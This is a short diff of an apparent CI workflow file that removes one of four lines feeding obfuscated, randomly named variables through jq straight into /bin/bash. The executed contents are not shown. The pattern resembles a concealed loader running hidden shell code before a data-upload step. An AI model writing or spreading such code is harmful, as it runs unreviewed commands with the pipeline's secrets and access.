@@ -28,7 +28,6 @@ jobs:
           echo $lqsw31 | jq -r .x0 | /bin/bash
           printf '%s' "$dfmmb381" | jq -r .bwmem4 | /bin/bash
           printf '%s' "$bpp187" | jq -r .dokz4 | /bin/bash
-          echo $kpu239 | jq -r .r00915 | /bin/bash
 
       - name: Upload data
         if: always()
